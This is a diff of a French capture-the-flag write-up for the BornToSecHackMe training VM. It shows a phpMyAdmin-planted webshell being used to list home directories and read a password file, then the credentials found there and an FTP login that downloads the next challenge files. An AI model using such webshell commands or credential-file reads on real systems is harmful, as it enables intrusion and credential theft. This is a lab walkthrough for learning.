@@ -107,33 +107,47 @@ Après quelques recherchers, cette version de phpMyAdmin est vulnérable à un [
   ```
   - Le premier a fonctionner est le dossier forum/templates_c, on obtient donc un moyen de lancer des commandes via PhPMyAdmin à l'adresse "https://192.168.56.#/forum/templates_c/webshell.php" grâce à la fonction [system](https://www.php.net/manual/en/function.system.php) de php!
 
-Avec la commande “uname -a”, on obtient par exemple des informations sur le système, qui nous seront utiles plus tard.
+- `uname -a`
+  > Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
+  -  Ces infos sur le système nous seront utiles plus tard.
+- `ls /home`
+  > [...]LOOKATME[...]
+- `ls /home/LOOKATME`
+  > password
+- `cat /home/LOOKATME/password`
+  > lmezard:G!@M6f4Eatau{sF"
 
-> Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
+En fouinant un découvre que le contenu de "/home/LOOKATME/password" contient des identifiants pour une connexion ftp:
+`lmezard` / `G!@M6f4Eatau{sF"`
 
-En fouinant un peu, on a aussi pu découvrir le contenu de "/home/LOOKATME/password"
+## Connexion FTP et le fichier fun
 
-Ce fichier password contient les identifiants pour une connexion ftp :
+- `brew install inetutils`
+- `ftp`
+  - `open`
+  - `192.168.56.#`
+  - `G!@M6f4Eatau{sF"`
 
-lmezard / G!@M6f4Eatau{sF"
+  - `ls`
+    ```shell
+    [...]
+      -rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+      -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+    [...]
+    ```
+  - `get README`
+  - `get fun`
+  - `quit`
 
-<h1> Connexion FTP et le fichier fun </h1>
+- `cat README`
+  ```shell
+    Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+  ```
 
-On se connecte donc en ftp à la VM avec les identifiants trouvés, à l'adresse 192.168.56.# puisque le port ftp y est ouvert.
-
-On télécharge le README et le fichier ‘fun’ grâce a la commande “get”.
-
-Contenu du README :
-
-> Complete this little challenge and use the result as password for user 'laurie' to login in ssh
-
-On lance ensuite :
-
->file fun
-
-Afin de connaître le type de ce fichier.
-
-> fun: POSIX tar archive (GNU)
+- `file fun`
+  ```shell
+    fun: POSIX tar archive (GNU)
+  ```
 
 En faisant une première analyse manuelle de ce fichier, on voit clairement qu'il contient du code C, avec un main contenant 12 fonctions getmeX(), qui doivent renvoyer un caractère.
 
